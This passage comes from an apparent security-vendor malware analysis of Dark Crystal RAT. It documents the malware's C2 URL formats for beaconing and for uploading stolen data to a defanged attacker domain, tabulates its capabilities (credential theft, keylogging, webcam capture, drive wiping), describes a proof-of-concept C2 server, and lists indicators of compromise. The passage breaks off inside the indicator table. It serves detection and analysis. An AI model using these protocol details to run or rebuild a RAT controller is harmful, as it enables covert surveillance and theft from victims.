requests to the C2 endpoint (domalo[.]online) without allowing the malware Internet access, we used <a href=\"https://github.com/fireeye/flare-fakenet-ng\">FLARE’s FakeNet-NG tool</a>. Figure 14 shows some of the C2 requests that the malware made being captured by FakeNet-NG.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure14.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 14: FakeNet-NG can capture the malware's HTTP requests to the C2 endpoint</span></p> \n<p>By comparing the messages generated by the malware and captured in FakeNet-NG with the malware’s decompiled code, we determined its message format and types. Observe that the last HTTP request visible in Figure 14 contains a list of running processes. By tracing through the decompiled code, we found that the method <span class=\"code\">SchemaServerManager.ObserverWatcher.NewMerchant</span> generated this message. We renamed this method to taskThread and assigned meaningful names to the other methods it calls; the resulting code for this method appears in Figure 15.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure15.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 15: The method that generates the list of running processes and sends it to the C2 endpoint</span></p> \n<p>By analyzing the code further, we identified the components of the URLs that the malware used to send data to the C2 endpoint, and how they are constructed.</p> \n<p> <i>Beacons</i></p> \n<p>The first type of URL is a beacon, sent only once when the malware starts up. For this sample, the beacon URL was always hxxp://domalo[.]online/ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91dueu3qa54/46kqbjvyklunp1z56txzk<br /> hen7gjci3cyx8ggkptx25i74mo6myqpx9klvv3/&lt;hash&gt;.php?data=active, where &lt;hash&gt; is the SHA1 hash of the MHost URL, as described earlier.</p> \n<p> <i>GET requests, format 1</i></p> \n<p>When the malware needs to send data to or receive data from the C2, it sends a message. The first type of message, which we denote as “format 1,” is a GET request to URLs of the form <span class=\"code\">hxxp://domalo[.]online/ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91dueu3qa54/46kqb<br /> jvyklunp1z56txzkhen7gjci3cyx8ggkptx25i74mo6myqpx9klvv3/akcii239myzon0xwjlxqnn<br /> 3b34w/<i>&lt;hash&gt;</i>.php? type=__ds_setdata&amp;__ds_setdata_user=<i>&lt;user_hash&gt;</i>&amp;__ds_setdata_ext=<i>&lt;message_hash&gt;</i>&amp;__ds_setdata_data=<i>&lt;message&gt;</i></span>, where:</p> \n<ul> \n <li> <i> <span class=\"code\">&lt;hash&gt;</span></i> is <span class=\"code\">MD5(SHA1(MHost))</span>, which for this sample, is <span class=\"code\">212bad81b4208a2b412dfca05f1d9fa7</span>.</li> \n <li> <i> <span class=\"code\">&lt;user_hash&gt;</span></i> is a unique identifier for the machine on which the malware is running. It is always calculated as <span class=\"code\">SHA1(OS_version + machine_name + user_name)</span> as provided by the .NET System.Environment class.</li> \n <li> <i> <span class=\"code\">&lt;message_hash&gt;</span></i> identifies what kind of message the malware is sending to the C2 endpoint. The <span class=\"code\">&lt;message_hash&gt;</span> is calculated as <span class=\"code\">MD5(&lt;message_type&gt; + &lt;user_hash&gt;)</span>, where <span class=\"code\">&lt;message_type&gt;</span> is a short keyword identifying the type of message, and <span class=\"code\">&lt;user_hash&gt;</span> is as calculated above.\n  <ul> \n   <li>Values for &lt;message_type&gt; exist for each command that the malware supports; for possible values, see the “msgs” variable in the code sample shown in Figure 19.</li> \n   <li>Observe that this makes it difficult to observe the message type visually from log traffic, or to write a static network signature for the message type, since it varies for every machine due to the inclusion of the <span class=\"code\">&lt;user_hash&gt;</span>.</li> \n   <li>One type of message uses the value u instead of a hash for <span class=\"code\">&lt;message_hash&gt;</span>.</li> \n  </ul> </li> \n <li> <i> <span class=\"code\">&lt;message&gt;</span></i> is the message data, which is not obscured in any way.</li> \n</ul> \n<p>The other type of ordinary message is a <span class=\"code\">getdata</span> message. These are GET requests to URLs of the form <span class=\"code\">hxxp://domalo[.]online/ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91dueu3qa54/46kqb<br /> jvyklunp1z56txzkhen7gjci3cyx8ggkptx25i74mo6myqpx9klvv3/akcii239myzon0xwjlxqnn<br /> 3b34w/<i>&lt;hash&gt;</i>.php? type=__ds_getdata&amp;__ds_getdata_user=<i>&lt;user_hash&gt;</i>&amp;__ds_getdata_ext=<i>&lt;message_hash&gt;</i>&amp;__ds_getdata_key=<i>&lt;key&gt;</i></span>, where:</p> \n<ul> \n <li> <i> <span class=\"code\">&lt;hash&gt;</span></i> and <i> <span class=\"code\">&lt;user_hash&gt;</span></i> are calculated as described above for getdata messages.</li> \n <li> <i> <span class=\"code\">&lt;message_hash&gt;</span></i> is also calculated as described above for getdata messages, but describes the type of message the malware is expecting to receive in the server’s response.</li> \n <li> <i> <span class=\"code\">&lt;key&gt;</span></i> is <span class=\"code\">MD5(&lt;user_hash&gt;)</span>.</li> \n</ul> \n<p>The server is expected to respond to a <span class=\"code\">getdata</span> message with an appropriate response for the type of message specified by <span class=\"code\">&lt;message_hash&gt;</span>.</p> \n<p> <i>GET requests, format 2</i></p> \n<p>A few types of messages from the malware to the C2 use a different format, which we denote as “format 2.” These messages are GET requests of the form <span class=\"code\">hxxp://domalo[.]online /ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91dueu3qa54/46kqbjvyklunp1z56txzkhen7gj<br /> ci3cyx8ggkptx25i74mo6myqpx9klvv3/akcii239myzon0xwjlxqnn3b34w/<i>&lt;user_hash&gt;</i>.<i>&lt;mes<br /> sage_hash&gt;</i></span>, where:</p> \n<ul> \n <li> <i> <span class=\"code\">&lt;user_hash&gt;</span></i> is calculated as described above for getdata messages.</li> \n <li> <i> <span class=\"code\">&lt;message_hash&gt;</span></i> is also calculated as described above for getdata messages, but describes the type of message the malware is expecting to receive in the server’s response. <span class=\"code\">&lt;message_hash&gt;</span> may also be the string <span class=\"code\">comm</span>.</li> \n</ul> \n<p>Table 1 shows possible <span class=\"code\">&lt;message_types&gt;</span> that may be incorporated into <span class=\"code\">&lt;message_hash&gt;</span> as part of format 2 messages to instruct the server which type of response is desired. In contrast to format 1 messages, format 2 messages are only used for a handful of <span class=\"code\">&lt;message_type&gt;</span> values.</p> \n<table border=\"0\" cellspacing=\"0\" cellpadding=\"0\"> \n <tbody> \n  <tr> \n   <td width=\"174\" valign=\"top\"><p> <b>&lt;message_type&gt;</b></p> </td> \n   <td width=\"449\" valign=\"top\"><p> <b>Response desired</b></p> </td> \n  </tr> \n  <tr> \n   <td width=\"174\" valign=\"top\"><p>s_comm</p> </td> \n   <td width=\"449\" valign=\"top\"><p>The server sends a non-empty response if a screenshot request is pending</p> </td> \n  </tr> \n  <tr> \n   <td width=\"174\" valign=\"top\"><p>m_comm</p> </td> \n   <td width=\"449\" valign=\"top\"><p>The server sends a non-empty response if a microphone request is pending</p> </td> \n  </tr> \n  <tr> \n   <td width=\"174\" valign=\"top\"><p>RDK</p> </td> \n   <td width=\"449\" valign=\"top\"><p>The server responds directly with keystrokes to replay</p> </td> \n  </tr> \n  <tr> \n   <td width=\"174\" valign=\"top\"><p>comm</p> </td> \n   <td width=\"449\" valign=\"top\"><p>The server responds directly with other types of tasking</p> </td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Table 1: Message types when the malware uses a special message to request tasking from the server</span></p> \n<p> <i>POST requests</i></p> \n<p>When the malware needs to upload large files, it makes a POST request. These POST requests are sent to <span class=\"code\">hxxp://domalo[.]online/ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91dueu3qa54/46kqb<br /> jvyklunp1z56txzkhen7gjci3cyx8ggkptx25i74mo6myqpx9klvv3/akcii239myzon0xwjlxqnn<br /> 3b34w/&lt;hash&gt;.php</span>, with the following parameters in the POST data:</p> \n<ul> \n <li> <i>name</i> is <span class=\"code\">&lt;user_hash&gt; + \".\" + &lt;message_type&gt;</span>, where <span class=\"code\">&lt;user_hash&gt;</span> is calculated as described above and <span class=\"code\">&lt;message_type&gt;</span> is the type of data being uploaded.</li> \n <li> <i>upload</i> is a file with the data being sent to the server.</li> \n</ul> \n<p>Table 2 shows possible <span class=\"code\">&lt;message_type&gt;</span> values along with the type of file being uploaded.</p> \n<table border=\"0\" cellspacing=\"0\" cellpadding=\"0\"> \n <tbody> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p>&lt;message_type&gt;</p> </td> \n   <td width=\"312\" valign=\"top\"><p>Type of File</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p>jpg</p> </td> \n   <td width=\"312\" valign=\"top\"><p>Screenshot</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p>zipstealerlog</p> </td> \n   <td width=\"312\" valign=\"top\"><p>Cookie stealer log</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p>wav</p> </td> \n   <td width=\"312\" valign=\"top\"><p>Microphone recording</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p>file</p> </td> \n   <td width=\"312\" valign=\"top\"><p>Uploaded file</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p>bmp</p> </td> \n   <td width=\"312\" valign=\"top\"><p>Webcam image</p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p>RD.jpg</p> </td> \n   <td width=\"312\" valign=\"top\"><p>Remote control screenshot</p> </td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Table 2: Message types when files are uploaded to the server</span></p> \n<p> <i>Capabilities</i></p> \n<p>By analyzing the code that handles the responses to the <span class=\"code\">comm</span> message (format 2), it was possible for us to inventory the malware’s capabilities. Table 3 shows the keywords used in responses along with the description of each capability.</p> \n<table border=\"0\" cellspacing=\"0\" cellpadding=\"0\" width=\"630\"> \n <tbody> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p> <b>Keyword</b></p> </td> \n   <td width=\"498\" valign=\"top\"><p> <b>Description</b></p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>shell</p> </td> \n   <td width=\"498\" valign=\"top\"><p>Execute a shell command</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>deleteall</p> </td> \n   <td width=\"498\" valign=\"top\"><p>Recursively delete all files from C:, D:, F:, and G:</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>closecd</p> </td> \n   <td width=\"498\" valign=\"top\"><p>Close the CD-ROM drive door</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>setwallpaper</p> </td> \n   <td width=\"498\" valign=\"top\"><p>Change the background wallpaper</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>ddos</p> </td> \n   <td width=\"498\" valign=\"top\"><p>Send TCP and UDP packets to a given host or IP address</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>logoff</p> </td> \n   <td width=\"498\" valign=\"top\"><p>Log off the current user</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>keyboardrecorder</p> </td> \n   <td width=\"498\" valign=\"top\"><p>Replay keystrokes as if the user had typed them</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>fm_newfolder</p> </td> \n   <td width=\"498\" valign=\"top\"><p>Create a new folder</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>fm_rename</p> </td> \n   <td width=\"498\" valign=\"top\"><p>Rename or move a file</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>desktopHide</p> </td> \n   <td width=\"498\" valign=\"top\"><p>Hide desktop icons</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>keyloggerstart</p> </td> \n   <td width=\"498\" valign=\"top\"><p>Start logging keystrokes</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>exec_cs_code</p> </td> \n   <td width=\"498\" valign=\"top\"><p>Compile and execute C# code</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>msgbox</p> </td> \n   <td width=\"498\" valign=\"top\"><p>Open a Windows MessageBox</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>fm_upload</p> </td> \n   <td width=\"498\" valign=\"top\"><p>Transfer a file from the C2 to the client</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>rdp</p> </td> \n   <td width=\"498\" valign=\"top\"><p>Re-spawn the malware running as an administrator</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>fm_zip</p> </td> \n   <td width=\"498\" valign=\"top\"><p>Build a ZIP file from a directory tree and transfer it from the client to the C2</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>webcam</p> </td> \n   <td width=\"498\" valign=\"top\"><p>Take a webcam picture</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>fm_unzip</p> </td> \n   <td width=\"498\" valign=\"top\"><p>Unzip a ZIP file to a given path on the client</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>keyloggerstop</p> </td> \n   <td width=\"498\" valign=\"top\"><p>Stop logging keystrokes</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>fm_drives</p> </td> \n   <td width=\"498\" valign=\"top\"><p>Enumerate drive letters</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>cookiestealer</p> </td> \n   <td width=\"498\" valign=\"top\"><p>Transfer cookies and browser/FileZilla saved credentials to the C2</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>fm_delete</p> </td> \n   <td width=\"498\" valign=\"top\"><p>Recursively delete a given directory</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>dismon</p> </td> \n   <td width=\"498\" valign=\"top\"><p>Hide desktop icons and taskbar</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>fm_uploadu</p> </td> \n   <td width=\"498\" valign=\"top\"><p>Transfer a file from the C2 to the client</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>taskstart</p> </td> \n   <td width=\"498\" valign=\"top\"><p>Start a process</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>cleardesktop</p> </td> \n   <td width=\"498\" valign=\"top\"><p>Rotate screen</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>lcmd</p> </td> \n   <td width=\"498\" valign=\"top\"><p>Run shell command and send standard output back to C2</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>taskbarShow</p> </td> \n   <td width=\"498\" valign=\"top\"><p>Show taskbar</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>clipboard</p> </td> \n   <td width=\"498\" valign=\"top\"><p>Set clipboard contents</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>cookiestealer_file</p> </td> \n   <td width=\"498\" valign=\"top\"><p>Save cookies and credentials to a local file</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>newuserpass</p> </td> \n   <td width=\"498\" valign=\"top\"><p>Create a new local user account</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>beep</p> </td> \n   <td width=\"498\" valign=\"top\"><p>Beep for set frequency and duration</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>speak</p> </td> \n   <td width=\"498\" valign=\"top\"><p>Use speech synthesizer to speak text</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>openchat</p> </td> \n   <td width=\"498\" valign=\"top\"><p>Open chat window</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>taskbarHide</p> </td> \n   <td width=\"498\" valign=\"top\"><p>Hide the taskbar</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>RDStart</p> </td> \n   <td width=\"498\" valign=\"top\"><p>Start remote control over user’s desktop</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>closechat</p> </td> \n   <td width=\"498\" valign=\"top\"><p>Close chat window</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>RDStop</p> </td> \n   <td width=\"498\" valign=\"top\"><p>Stop remote control over user’s desktop</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>fm_opendir</p> </td> \n   <td width=\"498\" valign=\"top\"><p>List directory contents</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>uninstall</p> </td> \n   <td width=\"498\" valign=\"top\"><p>Remove the malware from the client</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>taskkill</p> </td> \n   <td width=\"498\" valign=\"top\"><p>Kill a process</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>forkbomb</p> </td> \n   <td width=\"498\" valign=\"top\"><p>Endlessly spawn instances of cmd.exe</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>fm_get</p> </td> \n   <td width=\"498\" valign=\"top\"><p>Transfer a file from the client to the C2</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>desktopShow</p> </td> \n   <td width=\"498\" valign=\"top\"><p>Show desktop icons</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>Clipboardget</p> </td> \n   <td width=\"498\" valign=\"top\"><p>Transfer clipboard contents to C2</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>playaudiourl</p> </td> \n   <td width=\"498\" valign=\"top\"><p>Play a sound file</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>opencd</p> </td> \n   <td width=\"498\" valign=\"top\"><p>Open the CD-ROM drive door</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>shutdown</p> </td> \n   <td width=\"498\" valign=\"top\"><p>Shut down the machine</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>restart</p> </td> \n   <td width=\"498\" valign=\"top\"><p>Restart the machine</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>browseurl</p> </td> \n   <td width=\"498\" valign=\"top\"><p>Open a web URL in the default browser</p> </td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Table 3: Capabilities of DCRat</span></p> \n<h4>Proof-of-Concept Dark Crystal RAT Server</h4> \n<p>After gathering information from Dark Crystal RAT about its capabilities and C2 message format, another way to illustrate the capabilities and test our understanding of the messages was to write a proof-of-concept server. Here is a code snippet that we wrote containing a <a href=\"https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/pocdcrat.pdf\">barebones DCRat server written in Python</a>. Unlike a real RAT server, this one does not have a user interface to allow the attacker to pick and launch commands. Instead, it has a pre-scripted command list that it sends to the RAT.</p> \n<p>When the server starts up, it uses the Python BaseHTTPServer to begin listening for incoming web requests (lines 166-174). Incoming POST requests are assumed to hold a file that the RAT is uploading to the server; this server assumes all file uploads are screenshots and saves them to “screen.png” (lines 140-155). For GET requests, the server must distinguish between beacons, ordinary messages, and special messages (lines 123-138). For ordinary messages, <span class=\"code\">__ds_setdata</span> messages are simply printed to standard output, while the only <span class=\"code\">__ds_getdata</span> message type supported is <span class=\"code\">s_comm</span> (screenshot communications), to which the server responds with the desired screenshot dimensions (lines 63-84). For messages of type comm, the server sends four types of commands in sequence: first, it hides the desktop icons; then, it causes the string “Hello this is tech support” to be spoken; next, it displays a message box asking for a password; finally, it launches the Windows Calculator (lines 86-121).</p> \n<p>Figure 16 shows the results when Dark Crystal RAT is run on a system that has been configured to redirect all traffic to domalo[.]online to the proof-of-concept server we wrote.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure17.jpg\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 16: The results when a Dark Crystal RAT instance communicates with the proof-of-concept server</span></p> \n<h4>Other Work and Reconnaissance</h4> \n<p>After reverse engineering Dark Crystal RAT, we continued reconnaissance to see what additional information we could find. One limitation to our analysis was that we did not wish to allow the sample to communicate with the real C2, so we kept it isolated from the Internet. To learn more about Dark Crystal RAT we tried two approaches: the first was to browse the Dark Crystal RAT website (files.dcrat[.]ru) using Tor, and the other was to take a look at YouTube videos of others’ experiments with the “real” Dark Crystal RAT server.</p> \n<h5>Dark Crystal RAT Website</h5> \n<p>We found that Dark Crystal RAT has a website at files.dcrat[.]ru, shown in Figure 17. Observe that there are options to download the RAT itself, as well as a few plugins; the DCLIB extension is consistent with the plugin loading code we found in the RAT.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure18.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 17: The website files.dcrat[.]ru allows users to download Dark Crystal RAT and some of its plugins</span></p> \n<p>Figure 18 shows some additional plugins, including plugins with the ability to resist running in a virtual machine, disable Windows Defender, and disable webcam lights on certain models. No plugins were bundled with the sample we studied.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure19.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 18: Additional plugins listed on the Dark Crystal RAT website</span></p> \n<p>Figure 19 lists software downloads on the RAT page. We took some time to look at these files; here are some interesting things we discovered:</p> \n<ul> \n <li>The DCRat listed on the website is actually a “builder” that packages a build of the RAT and a configuration for the attacker to deploy. This is consistent with the name DCRatBuild.exe shown back in Figure 4. In our brief testing of the builder, we found that it had a licensing check. We did not pursue bypassing it once we found public YouTube videos of the DCRat builder in operation, as we show later.</li> \n <li>The DarkCrystalServer is not self-contained, rather, it is just a PHP file that allows the user to supply a username and password, which causes it to download and install the server software. Due to the need to supply credentials and communicate back with dcrat[.]ru (Figure 20), we did not pursue further analysis of DarkCrystalServer.</li> \n</ul> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure20.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 19: The RAT page lists software for the RAT, the server, an API, and plugin development</span></p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure21.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 20: The DarkCrystalServer asks for a username and password and calls back to dcrat[.]ru to download software, so we did not pursue it further</span></p> \n<h5>YouTube Videos</h5> \n<p>As part of confirming our findings about Dark Crystal RAT capabilities that we obtained through reverse engineering, we found some YouTube demonstrations of the DCRat builder and server.</p> \n<p>The YouTube user <i>LIKAR </i>has a <a href=\"https://www.youtube.com/watch?v=ElqjEzv9vog\">YouTube demonstration of Dark Crystal RAT</a>. The author demonstrates use of the Dark Crystal RAT software on a server with two active RAT instances. During the video, the author browses through the various screens in the software. This made it easy to envision how a cyber threat would use the RAT, and to confirm our suspicions of how it works.</p> \n<p>Figure 21 shows a capture from the video at <a href=\"https://youtu.be/ElqjEzv9vog?t=207\">3:27</a>. Note that the Dark Crystal RAT builder software refers to the DCRatBuild package as a “server” rather than a client. Nonetheless, observe that one of the options was a type of Java, or C# (Beta). By watching this YouTube video and doing some additional background research, we discovered that Dark Crystal RAT has existed for some time in a Java version. The C# version is relatively new. This explained why we could not find much detailed prior reporting about it.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure22.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 21: A YouTube demonstration revealed that Dark Crystal RAT previously existed in a Java version, and the C# version we analyzed is in beta</span></p> \n<p>Figure 22 shows another capture from the video at 6:28. The functionality displayed on the screen lines up nicely with the “msgbox”, “browseurl”, “clipboard”, “speak”, “opencd”, “closecd”, and other capabilities we discovered and enumerated in Table 6.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/dcrat/Figure23.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 22: A YouTube demonstration confirmed many of the Dark Crystal RAT capabilities we found in reverse engineering</span></p> \n<h4>Conclusion</h4> \n<p>In this post we walked through our analysis of the sample that the threat intel team provided to us and all its components. Through our initial triage, we found that its “dfsds.exe” component is Dark Crystal RAT. We found that Dark Crystal RAT was a .NET executable, and reverse engineered it. We extracted the malware’s configuration, and through dynamic analysis discovered the syntax of its C2 communications. We implemented a small proof-of-concept server to test the correct format of commands that can be sent to the malware, and how to interpret its uploaded screenshots. Finally, we took a second look at how actual threat actors would download and use Dark Crystal RAT.</p> \n<p>To conclude, indicators of compromise for this version of Dark Crystal RAT (MD5: 047af34af65efd5c6ee38eb7ad100a01) are given in Table 4.</p> \n<h4>Indicators of Compromise</h4> \n<h5>Dark Crystal RAT (dfsds.exe)</h5> \n<table border=\"0\" cellspacing=\"0\" cellpadding=\"0\"> \n <tbody> \n  <tr> \n   <td width=\"174\" valign=\"top\"><p> <b>Handle artifacts</b></p> </td> \n   <td width=\"450\" valign=\"top\"><p>&nbsp;</p> </td> \n  </tr> \n  <tr> \n   <td width=\"174\" valign=\"top\"><p>Mutex name</p> </td> \n   <td width=\"450\" valign=\"top\"><p>bc2dc004028c4f0303f5e49984983352</p> </td> \n  </tr> \n  <tr> \n   <td width=\"174\" valign=\"top\"><p> <b>Registry artifacts</b></p> </td> \n   <td width=\"450\" valign=\"top\"><p>&nbsp;</p> </td> \n  </tr> \n  <tr> \n   <td width=\"174\" valign=\"top\"><p>Registry value</p> </td> \n   <td width=\"450\" valign=\"top\"><p>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\scrss</p> </td> \n  </tr> \n  <tr> \n   <td width=\"174\" valign=\"top\"><p>Registry value</p> </td> \n   <td width=\"450\" valign=\"top\"><p>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Wininit</p> </td> \n  </tr> \n  <tr> \n   <td width=\"174\" valign=\"top\"><p> <b>File system artifacts</b></p> </td> \n   <td width=\"450\" valign=\"top\"><p>&nbsp;</p> </td> \n  </tr> \n  <tr> \n   <td width=\"174\" valign=\"top\"><p>File</p> </td> \n   <td width=\"450\" valign=\"top\"><p>C:\\Sysdll32.lnk</p> </td> \n  </tr> \n  <tr> \n   <td width=\"174\" valign=\"top\"><p>File</p> </td> \n   <td width=\"450\" valign=\"top\"><p>%APPDATA%\\dotNET.lnk</p> </td> \n  </tr> \n  <tr> \n   <td width=\"174\" valign=\"top\"><p>File</p> </td> \n   <td width=\"450\" valign=\"top\"><p>Start Menu\\Programs\\Startup\\Sysdll32.lnk</p> </td> \n  </tr> \n  <tr> \n   <td width=\"174\" valign=\"top\"><p>File</p> </td> \n   <td width=\"450\" valign=\"top\"><p>Start Menu\\Programs\\Startup\\dotNET.lnk</p> </td> \n  </tr> \n  <tr> \n   <td width=\"174\" valign=\"top\"><p>File</p> </td> \n   <td width=\"450\" valign=\"top\"><p>%APPDATA%\\&lt;random process name&gt;.exe</p> </td> \n  </tr> \n  <tr> \n   <td width=\"174\" valign=\"top\"><p>File</p> </td> \n   <td width=\"450\" valign=\"top\"><p>C:\\&lt;random process name&gt;.exe</p> </td> \n  </tr> \n  <tr> \n   <td width=\"174\" valign=\"top\"><p> <b>Network artifacts</b></p> </td> \n   <td width=\"450\" valign=\"top\"><p>&nbsp;</p> </td> \n  </tr> \n  <tr> \n   <td width=\"174\" valign=\"top\"><p>HTTP request</p> </td> \n   <td width=\"450\" valign=\"top\"><p>hxxp://domalo[.]online/ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91due<br /> u3qa54/46kqbjvyklunp1z56txzkhen7gjci3cyx8ggkptx25i74mo6myqpx9kl<br /> vv3/212bad81b4208a2b412dfca05f1d9fa7.php?data=active</p> </td> \n  </tr> \n  <tr> \n   <td width=\"174\" valign=\"top\"><p>HTTP request</p> </td> \n   <td width=\"450\" valign=\"top\"><p>hxxp://domalo[.]online/ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91due<br /> u3qa54/46kqbjvyklunp1z56txzkhen7gjci3cyx8ggkptx25i74mo6myqpx9kl<br /> vv3/akcii239myzon0xwjlxqnn3b34w212bad81b4208a2b412dfca05f1d9f<br /> a7.php? type=__ds_getdata&amp;__ds_getdata_user=&lt;user_hash&gt;&amp;__ds_getdata_ex<br /> t=&lt;message_hash&gt;&amp;__ds_getdata_key=&lt;key&gt;</p> </td> \n  </tr> \n  <tr> \n   <td width=\"174\" valign=\"top\"><p>HTTP request</p> </td> \n   <td width=\"450\" valign=\"top\"><p>hxxp://domalo[.]online /ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91dueu3qa54/46kqbjvyklunp<br /> 1z56txzkhen7gjci3cyx8ggkptx25i74mo6myqpx9klvv3/akcii239myzon0xw<br /> jlxqnn3b34w/&lt;user_hash&gt;.&lt;message_hash&gt;</p> </td> \n  </tr> \n  <tr> \n   <td width=\"174\" valign=\"top\"><p>TCP connection</p> </td> \n   <td width=\"450\" valign=\"top\"><p>domalo[.]online:80</p> </td> \n  </tr> \n  <tr> \n   <td width=\"174\" valign=\"top\"><p>TCP connection</p> </td> \n   <td width=\"450\" valign=\"top\"><p>ipinfo[.]ip</p> </td> \n  </tr> \n  <tr> \n   <td width=\"174\" valign=\"top\"><p>DNS lookup</p> </td> \n   <td width=\"450\" valign=\"top\"><p>domalo[.]online</p> </td> \n  </tr> \n  <tr> \n   <td width=\"174\" valign=\"top\"><p>DNS lookup</p> </td> \n   <td width=\"450\" valign=\"top\"><p>ipinfo[.]ip</p> </td> \n  </tr> \n  <tr> \n   